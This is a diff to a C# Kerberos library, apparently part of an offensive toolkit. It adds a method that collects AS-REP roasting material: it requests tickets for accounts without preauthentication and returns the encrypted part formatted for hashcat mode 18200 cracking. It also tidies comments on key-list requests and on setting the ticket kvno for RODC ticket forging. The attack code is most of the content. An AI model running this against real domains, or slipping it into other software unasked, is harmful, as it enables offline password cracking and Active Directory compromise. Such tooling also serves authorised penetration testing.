@@ -426,6 +426,51 @@ namespace Titanis.Security.Kerberos
 			throw new InvalidOperationException($"KDC did not require preauthentication for user {userName}@{targetRealm}.");
 		}
 
+		/// <summary>
+		/// AS-REP roast material for an account that does not require preauthentication
+		/// (hashcat mode 18200: $krb5asrep$etype$user@realm:nonce$cipher).
+		/// Returns null when the account requires preauthentication or does not exist.
+		/// </summary>
+		public sealed record AsRepRoastData(int Nonce, int EType, byte[] Cipher);
+
+		public async Task<AsRepRoastData?> TryGetAsRepAsync(
+			string targetRealm,
+			string userName,
+			EType[]? etypes,
+			CancellationToken cancellationToken)
+		{
+			ArgumentException.ThrowIfNullOrEmpty(targetRealm);
+			ArgumentException.ThrowIfNullOrEmpty(userName);
+
+			PreauthContext preauth = new PreauthKeyContext(this, null, this._callback)
+			{
+				_requestPac = true
+			};
+			TicketRequestContext context = new TicketRequestContext(null, null, preauth, null, false);
+
+			var asreq = this.CreateASReq(
+				context,
+				preauth,
+				Structs.KdcReqBody(
+					GetDefaultTgtParameters(),
+					Structs.PrincipalName(PrincipalNameType.Principal, userName),
+					targetRealm,
+					Structs.PrincipalName(PrincipalNameType.ServiceInstance, ServiceClassNames.Krbtgt, targetRealm),
+					context.nonce,
+					(etypes != null) ? (Array.ConvertAll(etypes, r => (int)r)) : this.GetAllETypes(),
+					this.MakeHostAddress(),
+					null
+				));
+
+			var rep = await this.TransceiveKdcAsync(targetRealm, LocateKdcOptions.Home, asreq, cancellationToken).ConfigureAwait(false);
+			if (rep.SelectedChoice == KDC_REP_CHOICE.ChoiceIndex.Asrep)
+			{
+				var enc = rep.Asrep.enc_part;
+				return new AsRepRoastData(context.nonce, enc.etype, enc.cipher);
+			}
+			return null;
+		}
+
 		private static DateTime Midpoint(DateTime start, DateTime end)
 		{
 			return start + (end - start) / 2;
@@ -731,12 +776,11 @@ namespace Titanis.Security.Kerberos
 			if (encPart.padata != null)
 				context.preauth.TryProcessPadata(ticketParams.CorrelationId, encPart.padata);
 
-
 			SessionKey? ticketKey = (0 != (ticketParams.Options & KdcOptions.EncTicketInSKey)) ? ticketParams.AdditionalTicket?.SessionKey : null;
 			TicketInfo ticketInfo = new TicketInfo(GetNextTicketSeqnbr(), rep.ticket, this.CreateSessionKeyFor(encPart.key), encPart, rep.cname.name_string[0].Value, rep.crealm.Value, context.Tgt?.AsrepKey, ticketKey);
 			ticketInfo.Comment = context.ticketParameters?.TicketComment;
 
-			// ATLAS-PATCH: surface KERB-KEY-LIST-REP ([MS-KILE] § 2.2.12) to callers
+			// surface KERB-KEY-LIST-REP ([MS-KILE] § 2.2.12) to callers
 			var atlasKeyListRep = encPart.padata?.FirstOrDefault(r => r.padata_type == (int)PadataType.KerbKeyListRep);
 			if (atlasKeyListRep is not null)
 			{
@@ -1048,7 +1092,7 @@ namespace Titanis.Security.Kerberos
 				padatas.Add(Structs.PAData_FastReq(padata_fastreq));
 			}
 
-			// ATLAS-PATCH: emit KERB-KEY-LIST-REQ when requested ([MS-KILE] § 2.2.11)
+			// emit KERB-KEY-LIST-REQ when requested ([MS-KILE] § 2.2.11)
 			if (ticketParameters.KeyListEtypes is not null)
 				padatas.Add(Structs.PAData_KerbKeyListReq(ticketParameters.KeyListEtypes));
 
@@ -1735,7 +1779,7 @@ namespace Titanis.Security.Kerberos
 					[adelem]
 					);
 
-				// ATLAS-PATCH: allow setting the ticket enc-part kvno (e.g. RODC krbtgt number)
+				// allow setting the ticket enc-part kvno (e.g. RODC krbtgt number)
 				if (encPartKvno.HasValue)
 					ticket.ticket.enc_part.kvno = encPartKvno.Value;
 
